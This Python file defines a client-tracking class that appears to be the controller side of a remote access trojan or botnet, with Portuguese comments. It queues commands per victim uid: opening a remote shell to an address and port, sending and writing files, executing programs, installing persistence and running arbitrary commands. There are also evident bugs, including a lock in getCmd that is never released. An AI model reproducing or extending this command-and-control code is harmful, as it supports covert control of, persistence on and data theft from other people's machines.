import threading
import time
class client:
    def __init__(self,uid,ip=""):
        self.uid=uid
        self.ip=ip
        self.cmd=None
        self.lastcmd=[]
        self.file=None
        self.result=""
        self.cvcmd = threading.Condition()
        self.cvfile = threading.Condition()
        self.setOK = True;

    def report(self,result):
        self.result=result

    def getCmd(self):
        self.cvcmd.acquire()

        while self.cmd==None:
        #    time.sleep(1)
            self.cvcmd.wait()
        #consume cmd
        result=self.cmd
        self.lastcmd=result
        self.cmd=None
        #self.cvcmd.release()

        return result
    
    def getFile(self):
        self.cvfile.acquire()

        while self.file==None:
            self.cvfile.wait()
        #consume file
        result=self.file
        self.file=None
        self.cvfile.release()

        return result



    def setCmd(self,cmdList):

        self.cvcmd.acquire() #interrupcao 
        #produce item
        self.cmd=cmdList
        self.cvcmd.notify() #acorda wait, fazendo o get pegar o comando
        self.cvcmd.release()

    def setFile(self,fname):
        self.cvfile.acquire()
        #produce item
        self.file=fname
        self.cvfile.notify()
        self.cvfile.release()

    def openShell(self,addr,port):
        self.setCmd(["openShell",addr,port])
        
    def sendFile(self,fname):
        print("setado: " + str(["sendfile",fname]))
        self.setCmd(["sendfile",fname])

    def writefile(self,fname):
        self.setCmd(["writefile",fname])
        self.setFile(fname)
    
    def executeProgram(self,fname):
        self.setCmd(["execute",fname])

    def installPersistency(self):
        self.setCmd(["install"])
    
    def runCommand(self,args):
        self.setCmd(["run"]+args)

    def clientOK(self):
        self.setCmd(["isOK"])
        time.sleep(1)# mudar para 5 quando terminar
        if (self.setOK):
            return False
        else:
            self.setOK=True;
            return True


    def __eq__(self,other):
        return self.uid==other.uid

    def __str__(self):
        return f"uid: {self.uid} ip:{self.ip} activeCmd: {self.cmd} lastcmd: {self.lastcmd} lastreport: {self.result}"
        
    def __repr__(self):
        return self.__str__()        